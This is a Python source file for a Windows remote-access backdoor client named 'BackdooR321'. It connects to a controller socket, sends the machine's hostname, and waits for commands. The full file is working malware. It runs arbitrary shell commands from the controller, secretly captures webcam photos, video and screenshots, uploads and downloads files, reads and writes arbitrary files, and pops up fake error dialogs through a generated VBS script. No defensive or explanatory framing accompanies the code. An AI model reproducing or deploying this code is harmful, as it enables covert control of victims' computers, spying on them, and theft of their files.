import socket
import os
import sys
import time
import subprocess
import shutil
import cv2
import win32api

from PIL import ImageGrab
from pynput import keyboard
from threading import *

while True:
    try:
        client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client_sock.connect(('127.0.0.1',8180))

        print("Connected!")
        host_name = socket.gethostname()
        print(socket.gethostname())
        client_sock.send(host_name.encode('utf-8'))

        def webcam_c_recv(client_sock):
            while True:
                break_data = client_sock.recv(1024).decode('utf-8')
                if(break_data == 'cancle'):
                    global webcam_c_break
                    webcam_c_break = 'true'
                    break

            
            
        def file_send(file_name,client_sock):
            file_rb = open(file_name,'rb')

            while True:
                file_rb_data = file_rb.read(3072)
                client_sock.send(file_rb_data)
                if not file_rb_data:
                    break
            file_rb.close()
            time.sleep(2)
            client_sock.send('end'.encode('utf-8'))
            
        def file_recv(file_name,client_sock):
            file_wb = open(file_name,'wb')

            while True:
                file_wb_data = client_sock.recv(3072)
                try:
                    if(file_wb_data.decode('utf-8') == 'end'):
                        break
                except:
                    file_wb.write(file_wb_data)
            file_wb.close()
        time.sleep(5)
        while True:
            client_sock.send(os.getcwd().encode('utf-8'))
            recv_cmd = client_sock.recv(3072).decode('utf-8')

            if('cd' in recv_cmd):
                os.chdir(recv_cmd.replace("cd ",""))
            if(recv_cmd == 'ls'):
                client_sock.send((str(os.listdir("."))).encode("utf-8"))
            if('mkdir' in recv_cmd):
                file_name = recv_cmd.replace('mkdir ','')
                os.mkdir(file_name)
            if('webcam' in recv_cmd):
                recv_t = Thread(target=webcam_c_recv,args=(client_sock,))
                recv_t.start()
                
                cap = cv2.VideoCapture(0)
                cap.set(3, 720)
                cap.set(4, 1080)
                if('webcam -c' in recv_cmd):
                    fourcc = cv2.VideoWriter_fourcc(*"XVID")
                    out = cv2.VideoWriter('cap.mp4',fourcc,20.0,(640,480))

                while True:
                    ret, frame = cap.read()
                    if('webcam -c' in recv_cmd):
                        out.write(frame)
                        cap_name = 'cap.mp4'
                    elif('webcam -p' in recv_cmd):
                        cv2.imwrite('cap.jpg',frame)
                        cap_name = 'cap.jpg'
                    if('-h' in recv_cmd):
                        pass
                    else:
                        cv2.imshow('Welcome To BackdooR321!!!',frame)
                    cv2.waitKey(1)
                    try:
                        if(webcam_c_break == 'true'):
                            webcam_c_break = ''
                            break
                    except:
                        pass
                cap.release()
                if('webcam -c' in recv_cmd):
                    out.release()
                cv2.destroyAllWindows()
                file_send(cap_name,client_sock)
                os.system(f"del {cap_name}")
                
            if('@' in recv_cmd):
                os.system("{}".format(recv_cmd.replace('@','')))
            if('$' in recv_cmd):
                popen_data = subprocess.check_output(recv_cmd.replace('$',''),stdin=subprocess.PIPE,stderr = subprocess.PIPE, shell = True).decode('cp949')
                client_sock.send(popen_data.encode('utf-8'))
            if('screenshot' in recv_cmd):
                os.system("mkdir C:\\error")
                
                file_name = "screenshot.jpg"
                img = ImageGrab.grab()
                img.save(file_name)

                file_rb = open("screenshot.jpg",'rb')
                while True:
                    file_rb_data = file_rb.read(3072)
                    client_sock.send(file_rb_data)
                    if not file_rb_data:
                        break
                file_rb.close()
                time.sleep(2)
                client_sock.send('end'.encode('utf-8'))
                os.system("del screenshot.jpg")
            if('exit' == recv_cmd):
                a = {}
                print(a[1234])
            if('txt -r' in recv_cmd):
                file_name = recv_cmd.replace('txt -r ','')
                file_r = open(file_name,'r')
                file_r_data = file_r.read().decode('euc-kr')
                client_sock.send(file_r_data.encode('utf-8'))
            if('beep' in recv_cmd):
                sound_option = recv_cmd.split(' ')
                sound_info = int(sound_option[1])
                sound_vol = int(sound_option[2])*1000

                win32api.Beep(sound_info,sound_vol)
                
            if('txt -w' in recv_cmd):
                file_name = recv_cmd.replace('txt -w ','')
                data = client_sock.recv(10000).decode('utf-8')
                file_w = open(file_name,'w')
                file_w.write(data.replace('^','\n'))
                file_w.close()
            if('download' in recv_cmd):
                
                file_name = recv_cmd.replace('download ','')
                file_send(file_name,client_sock)
            if('upload' in recv_cmd):
                file_name = recv_cmd.replace('upload ','')
                file_wb = open(file_name,'wb')

                while True:
                    file_wb_data = client_sock.recv(3072)
                    try:
                        if(file_wb_data.decode('utf-8') == 'end'):
                            break
                    except:
                        file_wb.write(file_wb_data)
                file_wb.close()
            if('msg' == recv_cmd):
                msg_cont = client_sock.recv(2024).decode('utf-8')
                msg_title = client_sock.recv(2024).decode('utf-8')

                os.system('mkdir C:\\error')
                os.system(f"echo x=msgbox(\"{msg_cont}\",0+16,\"{msg_title}\") > C:\\error\\error.vbs")
                os.system('start C:\\error\\error.vbs')
            if('dummy' == recv_cmd):
                pass
    except Exception as error:
        print(f"{error}")
        pass
    
        
                
